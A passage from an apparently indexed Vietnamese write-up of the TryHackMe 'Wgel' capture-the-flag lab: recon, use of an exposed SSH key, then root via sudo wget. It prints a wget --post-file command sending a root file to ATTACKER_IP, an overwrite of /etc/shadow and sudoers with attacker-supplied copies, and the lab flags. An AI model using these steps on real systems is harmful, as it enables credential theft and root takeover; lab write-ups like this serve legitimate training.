tr\u1ecdng trong h\u1ec7 th\u1ed1ng Unix v\u00e0 c\u00e1c h\u1ec7 th\u1ed1ng d\u1ef1a tr\u00ean Unix (nh\u01b0 Linux), \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng \u0111\u1ec3 qu\u1ea3n l\u00fd quy\u1ec1n truy c\u1eadp \u0111\u1eb7c bi\u1ec7t c\u1ee7a c\u00e1c ng\u01b0\u1eddi d\u00f9ng. N\u00f3 qu\u1ea3n l\u00fd quy\u1ec1n truy c\u1eadp \u0111\u1ec3 th\u1ef1c hi\u1ec7n c\u00e1c l\u1ec7nh v\u1edbi quy\u1ec1n h\u1ea1n \u0111\u1eb7c bi\u1ec7t (nh\u01b0 quy\u1ec1n root) th\u00f4ng qua l\u1ec7nh sudo. T\u1ec7p /etc/sudoers ch\u1ee9a danh s\u00e1ch c\u00e1c quy\u1ec1n truy c\u1eadp \u0111\u1eb7c bi\u1ec7t cho c\u00e1c ng\u01b0\u1eddi d\u00f9ng ho\u1eb7c nh\u00f3m ng\u01b0\u1eddi d\u00f9ng c\u1ee5 th\u1ec3, cho ph\u00e9p h\u1ecd th\u1ef1c hi\u1ec7n c\u00e1c l\u1ec7nh v\u1edbi quy\u1ec1n h\u1ea1n cao h\u01a1n m\u00e0 h\u1ecd th\u01b0\u1eddng kh\u00f4ng c\u00f3. C\u1ea5u tr\u00fac c\u1ee7a t\u1ec7p n\u00e0y c\u00f3 th\u1ec3 kh\u00e1 ph\u1ee9c t\u1ea1p v\u00e0 \u0111\u00f2i h\u1ecfi quy\u1ec1n truy c\u1eadp qu\u1ea3n tr\u1ecb (root) \u0111\u1ec3 ch\u1ec9nh s\u1eeda. M\u1ed7i d\u00f2ng trong t\u1ec7p /etc/sudoers ch\u1ee9a m\u1ed9t quy\u1ec1n truy c\u1eadp \u0111\u01b0\u1ee3c \u0111\u1ecbnh ngh\u0129a theo c\u00fa ph\u00e1p: nguoidung ALL=(quyen) lenh Trong \u0111\u00f3: nguoidung l\u00e0 t\u00ean ng\u01b0\u1eddi d\u00f9ng ho\u1eb7c nh\u00f3m ng\u01b0\u1eddi d\u00f9ng \u0111\u01b0\u1ee3c c\u1ea5p quy\u1ec1n truy c\u1eadp. ALL cho ph\u00e9p ng\u01b0\u1eddi d\u00f9ng s\u1eed d\u1ee5ng sudo t\u1eeb b\u1ea5t k\u1ef3 m\u00e1y t\u00ednh n\u00e0o. (quyen) l\u00e0 quy\u1ec1n truy c\u1eadp c\u1ee5 th\u1ec3 m\u00e0 ng\u01b0\u1eddi d\u00f9ng \u0111\u01b0\u1ee3c ph\u00e9p th\u1ef1c hi\u1ec7n. V\u00ed d\u1ee5: ALL, NOPASSWD, ALL=(ALL:ALL), v.v. lenh l\u00e0 l\u1ec7nh c\u1ee5 th\u1ec3 m\u00e0 ng\u01b0\u1eddi d\u00f9ng c\u00f3 th\u1ec3 th\u1ef1c hi\u1ec7n v\u1edbi quy\u1ec1n \u0111\u1eb7c bi\u1ec7t. V\u00ed d\u1ee5 c\u1ee5 th\u1ec3 v\u1ec1 n\u1ed9i dung trong t\u1ec7p /etc/sudoers: # Cho ph\u00e9p ng\u01b0\u1eddi d\u00f9ng alice th\u1ef1c hi\u1ec7n b\u1ea5t k\u1ef3 l\u1ec7nh n\u00e0o v\u1edbi quy\u1ec1n root m\u00e0 kh\u00f4ng c\u1ea7n m\u1eadt kh\u1ea9u alice ALL =( ALL : ALL ) NOPASSWD : ALL # Cho ph\u00e9p ng\u01b0\u1eddi d\u00f9ng bob th\u1ef1c hi\u1ec7n l\u1ec7nh reboot m\u00e0 kh\u00f4ng c\u1ea7n m\u1eadt kh\u1ea9u bob ALL =( ALL ) NOPASSWD : / sbin / reboot File sudoers trong CorpOne s\u1ebd nh\u01b0 th\u1ebf n\u00e0y \u0111\u00e2y /etc/sudoers Ta ch\u1ec9nh c\u1ea7n ch\u1ec9nh d\u00f2ng jessie ALL=(root) NOPASSWD: /usr/bin/wget th\u00e0nh jessie ALL=(root) NOPASSWD: ALL \u0111\u1ec3 user jessie leo quy\u1ec1n th\u00e0nh c\u00f4ng. root What we learned \u00b6 Privilege Escalation with wget","title":"CTF Wgel"},{"location":"tryhackme/room/wgelctf/#ctf-wgel","text":"Room at https://tryhackme.com/room/wgelctf List of the questions solved Question: User flag 057c67131c3d5e42dd5cd3075b198ff6 Question: Root flag b1b968b37519ad1daa6408188649263d","title":"CTF Wgel"},{"location":"tryhackme/room/wgelctf/#pentest-scenario","text":"Host: 10.10.157.188 \u0110\u00e2y l\u00e0 m\u1ed9t challenge thu\u1ed9c lo\u1ea1i easy nh\u01b0ng kh\u00e1 \u0111\u1ed9c \u0111\u00e1o v\u1ec1 h\u01b0\u1edbng ti\u1ebfp c\u1eadn v\u00e0 n\u00f3 kh\u00e1 hay n\u00ean t\u00f4i s\u1ebd n\u00f3i nhi\u1ec1u h\u01a1n m\u1ed9t x\u00edu","title":"Pentest scenario"},{"location":"tryhackme/room/wgelctf/#reconnaissance","text":"Nh\u01b0 c\u00e1c challenge kh\u00e1c, ta c\u0169ng scan m\u1ed9t v\u00e0i th\u1ee9 nh\u01b0 port, dir,... b\u1eb1ng nmap, gosbuter,... Nmap scan NULL PORT STATE SERVICE 22 / tcp open | filtered ssh 80 / tcp open | filtered http Gobuster scan / sitemap ( Status : 301 ) H\u00ecnh \u1ea3nh website Website n\u00e0y \u0111\u01b0\u1ee3c build b\u1edfi WordPress v\u00e0 d\u00f9ng Colorlib template. Ta v\u00e0o website OSINT v\u00e0i th\u1ee9 th\u00ec th\u1ea5y trang Contact Us nh\u01b0 b\u00ean d\u01b0\u1edbi Contact Us Nh\u00ecn c\u00f3 v\u1ebb khai th\u00e1c \u0111\u01b0\u1ee3c g\u00ec \u0111\u00f3, nh\u01b0ng sau m\u1ed9t v\u00e0i ph\u00e9p th\u1eed input trong c\u00e1c box, v\u00e0 xem tab network th\u00ec \u0111\u00e2y ch\u1ec9 l\u00e0 1 trang v\u00f4 h\u1ea1i m\u00e0 th\u00f4i :V. \u0110i theo h\u01b0\u1edbng khai th\u00e1c n\u00e0y l\u00e0 h\u1ecfng Website n\u00e0y b\u1eaft \u0111\u1ea7u t\u1eeb sitemap, ti\u1ebfp t\u1ee5c scan ti\u1ebfp \u0110\u00e2y l\u00e0 1 website build kh\u00e1 ch\u1ec9nh chu n\u00ean scan gobuster t\u1ed1n th\u1eddi gian l\u1eafm, dirbuster cho nhanh. Dirbuster scan L\u00fac n\u00e0y m\u1edbi xu\u1ea5t hi\u1ec7n v\u1ea5n \u0111\u1ec1 :3. Ta th\u1ea5y xu\u1ea5t hi\u1ec7n kh\u00e1 nhi\u1ec1u dir nh\u01b0ng ch\u1eb3ng c\u00f3 th\u1ec3 khai th\u00e1c \u0111\u01b0\u1ee3c g\u00ec t\u1ea1i v\u00ec ch\u00ednh c\u00e1i wordlist ta th\u01b0\u1eddng d\u00f9ng kh\u00f4ng c\u00f3 database cho file hidden . Ta ph\u1ea3i d\u00f9ng wordlist kh\u00e1c (c\u00e1i n\u00e0y hay n\u00e8). Gobuster scan =============================================================== /. hta ( Status : 403 ) [ Size : 277 ] /. htaccess ( Status : 403 ) [ Size : 277 ] /. htpasswd ( Status : 403 ) [ Size : 277 ] /. ssh ( Status : 301 ) [ Size : 319 ] [--> http :// xx . xx . xxx . xxx / sitemap /. ssh /] R\u1ed3i, c\u00f3 \u0111\u01b0\u1ee3c key ssh r\u1ed3i Th\u1eed d\u00f9ng john \u0111\u1ec3 crack password nhen :3 Gi\u1edd t\u00ecm username, t\u00ecm \u0111\u00e2u ra? Ta s\u1ebd ki\u1ec3m tra sourcecode web t\u1eebng c\u00e1i, v\u00e0 username n\u00f3 n\u1eb1m \u1edf c\u00e1i website ban \u0111\u1ea7u ::) Jessie","title":"Reconnaissance"},{"location":"tryhackme/room/wgelctf/#init-access","text":"Login b\u1eb1ng ssh th\u00f4i ssh -i id_rsa jessie@10.10.157.188 Sudo -l R\u1ed3i ngon lu\u00f4n, \u0111\u01b0\u1ee3c c\u00e1i quy\u1ec1n sudo wget","title":"Init Access"},{"location":"tryhackme/room/wgelctf/#privilege-escalation","text":"Th\u00f4ng th\u01b0\u1eddng g\u1eb7p leo quy\u1ec1n sudo nh\u01b0 v\u1ea7y, m\u1ecdi ng\u01b0\u1eddi s\u1ebd c\u00f3 xu h\u01b0\u1edbng l\u00ean https://gtfobins.github.io/gtfobins/wget v\u00e0 l\u1ea5y command v\u1ec1 ch\u1ea1y. Th\u00ec v\u1edbi b\u00e0i n\u00e0y, ta l\u00e0m nh\u01b0 th\u1ebf n\u00f3 kh\u00f4ng work. \u0110\u1ed1i v\u1edbi ng\u1eef c\u1ea3nh c\u1ee7a challenge tr\u00ean TryHackMe, d\u1ec5 d\u00e0ng ta bi\u1ebft \u0111\u01b0\u1ee3c file root.txt n\u1eb1m trong /root/root.txt. Do \u0111\u00f3 ta c\u00f3 th\u1ec3 l\u1ea5y \u0111\u01b0\u1ee3c file n\u00e0y d\u1ec5 d\u00e0ng b\u1eb1ng wget C\u00e1ch l\u1ea5y T\u1ea1i m\u00e1y jessie Terminal sudo wget - -post -file =/ root / root_flag . txt ATTACKER_IP : ATTACKER_PORT_LISTEN T\u1ea1i m\u00e1y attacker Terminal nc -lnvp ATTACKER_PORT_LISTEN Nh\u01b0ng c\u00e1i quan tr\u1ecdng c\u1ee7a ta l\u00e0 leo quy\u1ec1n root. Ch\u1ec9nh s\u1eeda file sudoers","title":"Privilege Escalation"},{"location":"tryhackme/room/wgelctf/#some-problems","text":"N\u00f3i v\u1ec1 vi\u1ec7c leo quy\u1ec1n v\u1edbi wget th\u00ec ta c\u00f3 nhi\u1ec1u h\u01b0\u1edbng ti\u1ebfp c\u1eadn, v\u00ec ta c\u00f3 th\u1ec3 linh \u0111\u1ed9ng trong vi\u1ec7c v\u1eadn chuy\u1ec3n v\u00e0 s\u1eeda \u0111\u1ed5i c\u00e1c file nh\u1ea1y c\u1ea3m nh\u01b0 passwd, shadow, crontab,... hay \u0111\u1eb7c bi\u1ec7t h\u01a1n l\u00e0 file sudoers. Vi\u1ec7c t\u00f4i x\u1ebfp lo\u1ea1i file passwd tr\u01b0\u1edbc file shadow nh\u01b0ng l\u1ea1i tr\u00ecnh b\u00e0y sau file shadow (2 ch\u1ec9 m\u1ee5c b\u00ean d\u01b0\u1edbi) \u0111\u1ec1u c\u00f3 \u00fd \u0111\u1ed3 c\u1ea3 \u0111\u1ea5y. B\u1ea1n th\u1eed \u0111o\u00e1n nh\u00e9. C\u00e1c \u0111\u1ecbnh ngh\u0129a b\u00ean d\u01b0\u1edbi, t\u00f4i d\u00f9ng ChatGPT gi\u1ea3i th\u00edch.","title":"Some problems"},{"location":"tryhackme/room/wgelctf/#etcshadow","text":"/etc/shadow l\u00e0 m\u1ed9t t\u1ec7p v\u0103n b\u1ea3n trong h\u1ec7 th\u1ed1ng Unix v\u00e0 c\u00e1c h\u1ec7 th\u1ed1ng d\u1ef1a tr\u00ean Unix (nh\u01b0 Linux) \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng \u0111\u1ec3 l\u01b0u tr\u1eef th\u00f4ng tin v\u1ec1 m\u1eadt kh\u1ea9u c\u1ee7a ng\u01b0\u1eddi d\u00f9ng. Kh\u00e1c v\u1edbi t\u1ec7p /etc/passwd, t\u1ec7p /etc/shadow ch\u1ee9a c\u00e1c th\u00f4ng tin v\u1ec1 m\u1eadt kh\u1ea9u \u0111\u00e3 \u0111\u01b0\u1ee3c b\u0103m (hash) v\u00e0 \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng \u0111\u1ec3 x\u00e1c th\u1ef1c ng\u01b0\u1eddi d\u00f9ng khi h\u1ecd \u0111\u0103ng nh\u1eadp v\u00e0o h\u1ec7 th\u1ed1ng. C\u1ea5u tr\u00fac c\u1ee7a m\u1ed7i d\u00f2ng trong t\u1ec7p /etc/shadow bao g\u1ed3m c\u00e1c tr\u01b0\u1eddng c\u00e1ch nhau b\u1eb1ng d\u1ea5u hai ch\u1ea5m (\":\"): T\u00ean ng\u01b0\u1eddi d\u00f9ng (Username): T\u00ean \u0111\u0103ng nh\u1eadp duy nh\u1ea5t cho t\u00e0i kho\u1ea3n ng\u01b0\u1eddi d\u00f9ng. M\u1eadt kh\u1ea9u (Password): M\u1eadt kh\u1ea9u \u0111\u00e3 \u0111\u01b0\u1ee3c b\u0103m (hash) v\u00e0 \u0111\u01b0\u1ee3c l\u01b0u tr\u1eef \u1edf \u0111\u00e2y. Thay v\u00ec l\u01b0u tr\u1eef m\u1eadt kh\u1ea9u \u1edf b\u1ea3n r\u00f5, h\u1ec7 th\u1ed1ng l\u01b0u tr\u1eef m\u1ed9t gi\u00e1 tr\u1ecb b\u0103m c\u1ee7a m\u1eadt kh\u1ea9u, l\u00e0 m\u1ed9t chu\u1ed7i kh\u00f4ng th\u1ec3 \u0111\u1ea3o ng\u01b0\u1ee3c \u0111\u1ec3 kh\u00f4i ph\u1ee5c m\u1eadt kh\u1ea9u g\u1ed1c. Ng\u00e0y thay \u0111\u1ed5i m\u1eadt kh\u1ea9u cu\u1ed1i c\u00f9ng (Last Password Change): \u0110\u00e2y l\u00e0 s\u1ed1 ng\u00e0y t\u00ednh t\u1eeb ng\u00e0y 1/1/1970 (epoch) \u0111\u1ebfn ng\u00e0y thay \u0111\u1ed5i m\u1eadt kh\u1ea9u cu\u1ed1i c\u00f9ng. Th\u00f4ng tin n\u00e0y \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng \u0111\u1ec3 ki\u1ec3m tra xem m\u1eadt kh\u1ea9u c\u00f3 c\u1ea7n ph\u1ea3i thay \u0111\u1ed5i hay kh\u00f4ng. Ng\u00e0y t\u1ed1i thi\u1ec3u \u0111\u1ec3 thay \u0111\u1ed5i m\u1eadt kh\u1ea9u ti\u1ebfp theo (Minimum Password Age): S\u1ed1 ng\u00e0y t\u1ed1i thi\u1ec3u gi\u1eefa c\u00e1c l\u1ea7n thay \u0111\u1ed5i m\u1eadt kh\u1ea9u. Ng\u00e0y t\u1ed1i \u0111a \u0111\u1ec3 thay \u0111\u1ed5i m\u1eadt kh\u1ea9u ti\u1ebfp theo (Maximum Password Age): S\u1ed1 ng\u00e0y t\u1ed1i \u0111a m\u00e0 m\u1ed9t m\u1eadt kh\u1ea9u c\u00f3 th\u1ec3 t\u1ed3n t\u1ea1i tr\u01b0\u1edbc khi ng\u01b0\u1eddi d\u00f9ng b\u1eaft bu\u1ed9c ph\u1ea3i thay \u0111\u1ed5i. S\u1ed1 ng\u00e0y c\u1ea3nh b\u00e1o tr\u01b0\u1edbc khi h\u1ebft h\u1ea1n m\u1eadt kh\u1ea9u (Password Expiry Warning): S\u1ed1 ng\u00e0y tr\u01b0\u1edbc khi m\u1eadt kh\u1ea9u h\u1ebft h\u1ea1n, ng\u01b0\u1eddi d\u00f9ng s\u1ebd \u0111\u01b0\u1ee3c c\u1ea3nh b\u00e1o. S\u1ed1 ng\u00e0y sau khi h\u1ebft h\u1ea1n m\u1eadt kh\u1ea9u m\u00e0 t\u00e0i kho\u1ea3n v\u1eabn c\u00f2n ho\u1ea1t \u0111\u1ed9ng (Account Inactivity): S\u1ed1 ng\u00e0y m\u00e0 t\u00e0i kho\u1ea3n c\u00f3 th\u1ec3 t\u1ed3n t\u1ea1i sau khi m\u1eadt kh\u1ea9u \u0111\u00e3 h\u1ebft h\u1ea1n. Ng\u00e0y h\u1ebft h\u1ea1n t\u00e0i kho\u1ea3n (Account Expiry Date): Ng\u00e0y m\u00e0 t\u00e0i kho\u1ea3n s\u1ebd h\u1ebft h\u1ea1n v\u00e0 kh\u00f4ng th\u1ec3 s\u1eed d\u1ee5ng n\u1eefa. T\u00e0i kho\u1ea3n b\u1ecb kh\u00f3a (Account Disabled): Tr\u01b0\u1eddng n\u00e0y x\u00e1c \u0111\u1ecbnh xem t\u00e0i kho\u1ea3n c\u00f3 b\u1ecb kh\u00f3a hay kh\u00f4ng. /etc/shadow \u0111\u01b0\u1ee3c b\u1ea3o v\u1ec7 c\u1ea9n th\u1eadn v\u00e0 ch\u1ec9 c\u00f3 quy\u1ec1n truy c\u1eadp h\u1ea1n ch\u1ebf cho ng\u01b0\u1eddi d\u00f9ng root ho\u1eb7c c\u00e1c qu\u1ea3n tr\u1ecb vi\u00ean h\u1ec7 th\u1ed1ng. \u0110i\u1ec1u n\u00e0y gi\u00fap b\u1ea3o v\u1ec7 th\u00f4ng tin m\u1eadt kh\u1ea9u c\u1ee7a ng\u01b0\u1eddi d\u00f9ng kh\u1ecfi vi\u1ec7c truy c\u1eadp tr\u00e1i ph\u00e9p. Tuy ta kh\u00f4ng c\u00f3 quy\u1ec1n xem file /etc/shadow nh\u01b0ng ta l\u1ea1i c\u00f3 quy\u1ec1n sudo wget. Do \u0111\u00f3, ta c\u00f3 th\u1ec3 d\u00f9ng wget \u0111\u1ec3 t\u1ea1o k\u1ebft n\u1ed1i nh\u1eb1m d\u00f9ng john \u0111\u1ec3 t\u00ecm password c\u1ee7a root trong file /etc/shadow nh\u01b0ng h\u01b0\u1edbng n\u00e0y bruteforce kh\u00f4ng ra password, n\u00ean t\u00f4i kh\u00f4ng \u0111\u1ec3 v\u00e0o ng\u1eef c\u1ea3nh tri\u1ec3n khai. Th\u1ef1c ra h\u01b0\u1edbng n\u00e0y ta c\u00f3 th\u1ec3 \u0111o\u00e1n t\u1eeb \u0111\u1ea7u l\u00e0 kh\u00f4ng th\u1ec3 k\u1ec3 t\u1eeb l\u00fac bruteforce kh\u00f4ng ra password t\u1eeb id_rsa key r\u1ed3i. Nh\u01b0ng m\u00e0 khoan, ta c\u00f3 th\u1ec3 c\u00e0i \u0111\u1eb7t password m\u1edbi cho root m\u00e0, \u0111\u00fang kh\u00f4ng? script.py Script t\u1ea1o password abc cho root import crypt crypt . crypt ( 'abc' ) output: $6$Datncmm.PBBQkKys$5WA2bUtuR6eEXngZIQDMKSXZ8woGOWeXn85GeoCexca8FOapBGA5HKAGRlhkm3P.qrd5bMwgvJazlBAli5rWo1 Oke gi\u1edd ta s\u1ebd t\u1ea1o cho root password l\u00e0 abc v\u00e0 ghi v\u00e0o file shadow shadow V\u1eadn chuy\u1ec3n file shadow \u0111\u1ebfn m\u00e1y jessie C\u00e1ch v\u1eadn chuy\u1ec3n T\u1ea1i m\u00e1y attacker Terminal python3 -m http . server T\u1ea1i m\u00e1y jessie Terminal sudo wget ATTACKER_IP : ATTACKER_PORT_LISTEN / shadow - -output-document = shadow","title":"/etc/shadow"},{"location":"tryhackme/room/wgelctf/#etcpasswd","text":"/etc/passwd l\u00e0 m\u1ed9t t\u1ec7p v\u0103n b\u1ea3n trong h\u1ec7 th\u1ed1ng Unix v\u00e0 c\u00e1c h\u1ec7 th\u1ed1ng d\u1ef1a tr\u00ean Unix (nh\u01b0 Linux) \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng \u0111\u1ec3 l\u01b0u tr\u1eef th\u00f4ng tin t\u00e0i kho\u1ea3n ng\u01b0\u1eddi d\u00f9ng: Trong qu\u00e1 kh\u1ee9 , n\u00f3 th\u01b0\u1eddng ch\u1ee9a th\u00f4ng tin c\u01a1 b\u1ea3n v\u1ec1 c\u00e1c t\u00e0i kho\u1ea3n ng\u01b0\u1eddi d\u00f9ng tr\u00ean h\u1ec7 th\u1ed1ng. Hi\u1ec7n nay n\u00f3 th\u01b0\u1eddng ch\u1ec9 ch\u1ee9a m\u1ed9t lo\u1ea1t c\u00e1c m\u1ee5c th\u1ec3 hi\u1ec7n th\u00f4ng tin ng\u01b0\u1eddi d\u00f9ng. C\u1ea5u tr\u00fac c\u1ee7a m\u1ed7i d\u00f2ng trong t\u1ec7p /etc/passwd bao g\u1ed3m c\u00e1c tr\u01b0\u1eddng c\u00e1ch nhau b\u1eb1ng d\u1ea5u hai ch\u1ea5m (\":\"): T\u00ean ng\u01b0\u1eddi d\u00f9ng (Username): \u0110\u00e2y l\u00e0 t\u00ean \u0111\u0103ng nh\u1eadp duy nh\u1ea5t cho t\u00e0i kho\u1ea3n ng\u01b0\u1eddi d\u00f9ng. M\u1eadt kh\u1ea9u (Password): Trong qu\u00e1 kh\u1ee9 , m\u1eadt kh\u1ea9u th\u01b0\u1eddng \u0111\u01b0\u1ee3c l\u01b0u tr\u1eef \u1edf \u0111\u00e2y d\u01b0\u1edbi d\u1ea1ng b\u0103m (hash). Hi\u1ec7n nay, h\u1ea7u h\u1ebft c\u00e1c h\u1ec7 th\u1ed1ng s\u1eed d\u1ee5ng c\u00e1c c\u01a1 ch\u1ebf b\u1ea3o m\u1eadt kh\u00e1c \u0111\u1ec3 l\u01b0u tr\u1eef m\u1eadt kh\u1ea9u, v\u00e0 tr\u01b0\u1eddng n\u00e0y th\u01b0\u1eddng ch\u1ec9 ch\u1ee9a m\u1ed9t d\u1ea5u \"x\" ho\u1eb7c m\u1ed9t k\u00fd t\u1ef1 ng\u1eabu nhi\u00ean. \u0110i\u1ec1u quan tr\u1ecdng h\u01a1n h\u1ebft l\u00e0 password hi\u1ec7n nay s\u1ebd l\u01b0u t\u1ea1i /etc/shadow. User ID (UID): \u0110\u00e2y l\u00e0 m\u1ed9t s\u1ed1 duy nh\u1ea5t \u0111\u01b0\u1ee3c g\u00e1n cho m\u1ed7i ng\u01b0\u1eddi d\u00f9ng tr\u00ean h\u1ec7 th\u1ed1ng. Group ID (GID): \u0110\u00e2y l\u00e0 s\u1ed1 nh\u00f3m ch\u1ee9a ng\u01b0\u1eddi d\u00f9ng, th\u01b0\u1eddng l\u00e0 m\u1ed9t nh\u00f3m m\u1eb7c \u0111\u1ecbnh. Th\u00f4ng tin v\u1ec1 ng\u01b0\u1eddi d\u00f9ng (User Info): M\u00f4 t\u1ea3 th\u00eam v\u1ec1 ng\u01b0\u1eddi d\u00f9ng ho\u1eb7c t\u00e0i kho\u1ea3n. Th\u01b0 m\u1ee5c nh\u00e0 (Home Directory): \u0110\u00e2y l\u00e0 th\u01b0 m\u1ee5c m\u00e0 ng\u01b0\u1eddi d\u00f9ng s\u1ebd truy c\u1eadp khi \u0111\u0103ng nh\u1eadp. Shell: \u0110\u00e2y l\u00e0 ch\u01b0\u01a1ng tr\u00ecnh d\u00f2ng l\u1ec7nh m\u00e0 ng\u01b0\u1eddi d\u00f9ng s\u1eed d\u1ee5ng khi \u0111\u0103ng nh\u1eadp. Tuy nhi\u00ean, \u0111i\u1ec1u quan tr\u1ecdng c\u1ea7n l\u01b0u \u00fd l\u00e0 v\u1edbi c\u00e1c phi\u00ean b\u1ea3n h\u1ec7 \u0111i\u1ec1u h\u00e0nh hi\u1ec7n \u0111\u1ea1i, th\u00f4ng tin t\u00e0i kho\u1ea3n ng\u01b0\u1eddi d\u00f9ng th\u01b0\u1eddng kh\u00f4ng \u0111\u01b0\u1ee3c l\u01b0u tr\u1eef tr\u1ef1c ti\u1ebfp trong t\u1ec7p /etc/passwd n\u1eefa v\u00ec l\u00fd do b\u1ea3o m\u1eadt. Thay v\u00e0o \u0111\u00f3, th\u00f4ng tin t\u00e0i kho\u1ea3n th\u01b0\u1eddng \u0111\u01b0\u1ee3c qu\u1ea3n l\u00fd b\u1edfi c\u00e1c c\u01a1 ch\u1ebf qu\u1ea3n l\u00fd t\u00e0i kho\u1ea3n v\u00e0 b\u1ea3o m\u1eadt h\u1ec7 th\u1ed1ng kh\u00e1c (/etc/shadow). Ch\u00ednh v\u00ec nh\u1eefng l\u00fd gi\u1ea3i tr\u00ean, v\u1ec1 m\u1eb7t b\u1ea3n ch\u1ea5t file /etc/passwd v\u1eabn c\u00f3 th\u1ec3 l\u01b0u password t\u00e0i kho\u1ea3n \u0111\u01b0\u1ee3c (thay th\u1ebf v\u1ecb tr\u00ed \"x\" trong file). N\u00ean ta c\u00f3 th\u1ec3 ghi tr\u1ef1c ti\u1ebfp password v\u00e0o file n\u00e0y. \"/etc/shadow l\u00e0m \u0111\u01b0\u1ee3c th\u00ec /etc/passwd l\u00e0m \u0111\u01b0\u1ee3c\" passwd","title":"/etc/passwd"},{"location":"tryhackme/room/wgelctf/#etccrontab","text":"T\u1ec7p /etc/crontab l\u00e0 m\u1ed9t t\u1ec7p v\u0103n b\u1ea3n \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng trong h\u1ec7 th\u1ed1ng Unix v\u00e0 c\u00e1c h\u1ec7 th\u1ed1ng d\u1ef1a tr\u00ean Unix (nh\u01b0 Linux) \u0111\u1ec3 \u0111\u1ecbnh l\u1ecbch ch\u1ea1y c\u00e1c t\u00e1c v\u1ee5 \u0111\u1ecbnh k\u1ef3 t\u1ef1 \u0111\u1ed9ng (cron jobs). Cron jobs l\u00e0 c\u00e1c t\u00e1c v\u1ee5 \u0111\u01b0\u1ee3c l\u00ean l\u1ecbch \u0111\u1ec3 th\u1ef1c hi\u1ec7n m\u1ed9t c\u00e1ch t\u1ef1 \u0111\u1ed9ng v\u00e0o c\u00e1c th\u1eddi \u0111i\u1ec3m c\u1ee5 th\u1ec3, v\u00ed d\u1ee5 nh\u01b0 h\u00e0ng ng\u00e0y, h\u00e0ng tu\u1ea7n, ho\u1eb7c m\u1ed7i gi\u1edd. C\u1ea5u tr\u00fac c\u1ee7a m\u1ed7i d\u00f2ng trong t\u1ec7p /etc/crontab th\u01b0\u1eddng bao g\u1ed3m c\u00e1c tr\u01b0\u1eddng c\u00e1ch nhau b\u1eb1ng d\u1ea5u c\u00e1ch: Ph\u00fat (Minute): Ph\u00fat c\u1ee5 th\u1ec3 trong m\u1ed7i gi\u1edd m\u00e0 t\u00e1c v\u1ee5 s\u1ebd \u0111\u01b0\u1ee3c th\u1ef1c hi\u1ec7n (gi\u00e1 tr\u1ecb t\u1eeb 0 \u0111\u1ebfn 59). Gi\u1edd (Hour): Gi\u1edd c\u1ee5 th\u1ec3 trong ng\u00e0y m\u00e0 t\u00e1c v\u1ee5 s\u1ebd \u0111\u01b0\u1ee3c th\u1ef1c hi\u1ec7n (gi\u00e1 tr\u1ecb t\u1eeb 0 \u0111\u1ebfn 23). Ng\u00e0y trong th\u00e1ng (Day of Month): Ng\u00e0y trong th\u00e1ng m\u00e0 t\u00e1c v\u1ee5 s\u1ebd \u0111\u01b0\u1ee3c th\u1ef1c hi\u1ec7n (gi\u00e1 tr\u1ecb t\u1eeb 1 \u0111\u1ebfn 31). Th\u00e1ng (Month): Th\u00e1ng m\u00e0 t\u00e1c v\u1ee5 s\u1ebd \u0111\u01b0\u1ee3c th\u1ef1c hi\u1ec7n (gi\u00e1 tr\u1ecb t\u1eeb 1 \u0111\u1ebfn 12 ho\u1eb7c c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng t\u00ean th\u00e1ng). Ng\u00e0y trong tu\u1ea7n (Day of Week): Ng\u00e0y trong tu\u1ea7n m\u00e0 t\u00e1c v\u1ee5 s\u1ebd \u0111\u01b0\u1ee3c th\u1ef1c hi\u1ec7n (gi\u00e1 tr\u1ecb t\u1eeb 0 \u0111\u1ebfn 6, v\u1edbi 0 l\u00e0 Ch\u1ee7 Nh\u1eadt). Ng\u01b0\u1eddi d\u00f9ng (User): T\u00ean ng\u01b0\u1eddi d\u00f9ng m\u00e0 t\u00e1c v\u1ee5 s\u1ebd \u0111\u01b0\u1ee3c th\u1ef1c hi\u1ec7n d\u01b0\u1edbi quy\u1ec1n c\u1ee7a. \u0110\u00e2y l\u00e0 t\u00f9y ch\u1ecdn, n\u1ebfu kh\u00f4ng c\u00f3, t\u00e1c v\u1ee5 s\u1ebd \u0111\u01b0\u1ee3c th\u1ef1c hi\u1ec7n d\u01b0\u1edbi quy\u1ec1n ng\u01b0\u1eddi d\u00f9ng root. L\u1ec7nh (Command): L\u1ec7nh c\u1ee5 th\u1ec3 m\u00e0 b\u1ea1n mu\u1ed1n th\u1ef1c hi\u1ec7n trong t\u00e1c v\u1ee5 cron. T\u1ec7p /etc/crontab th\u01b0\u1eddng ch\u1ec9 \u0111\u01b0\u1ee3c s\u1eeda \u0111\u1ed5i b\u1edfi ng\u01b0\u1eddi d\u00f9ng c\u00f3 quy\u1ec1n qu\u1ea3n tr\u1ecb (root) v\u00e0 ch\u1ee9a c\u00e1c t\u00e1c v\u1ee5 \u0111\u01b0\u1ee3c x\u00e1c \u0111\u1ecbnh b\u1edfi h\u1ec7 th\u1ed1ng ho\u1eb7c qu\u1ea3n tr\u1ecb vi\u00ean h\u1ec7 th\u1ed1ng \u0111\u1ec3 t\u1ef1 \u0111\u1ed9ng th\u1ef1c hi\u1ec7n c\u00e1c t\u00e1c v\u1ee5 nh\u01b0 sao l\u01b0u d\u1eef li\u1ec7u, c\u1eadp nh\u1eadt h\u1ec7 th\u1ed1ng, ho\u1eb7c th\u1ef1c hi\u1ec7n c\u00e1c t\u00e1c v\u1ee5 \u0111\u1ecbnh k\u1ef3 kh\u00e1c. /etc/crontab V\u1ec1 ph\u1ea7n crontab ta c\u00f3 th\u1ec3 schedule b\u1ea5t k\u00ec \u0111i\u1ec1u g\u00ec. V\u00ed d\u1ee5 nh\u01b0 l\u00e0 m\u1edf revershell \u0111\u1ec3 chi\u1ebfm quy\u1ec1n admin,... D\u00f9ng l\u1ec7nh systemctl status cron \u0111\u1ec3 xem status cron \u00dd t\u01b0\u1edfng t\u00f4i mu\u1ed1n th\u1ef1c hi\u1ec7n cronjob \u1edf \u0111\u00e2y l\u00e0 ghi v\u00e0o file sudoers, th\u00ec \u00fd t\u01b0\u1edfng n\u00e0y t\u00f4i \u0111\u00e3 tri\u1ec3n khai \u1edf d\u01b0\u1edbi ph\u1ea7n /etc/sudoers B\u1ea1n c\u00f3 th\u1ec3 xem th\u00eam t\u1ea1i 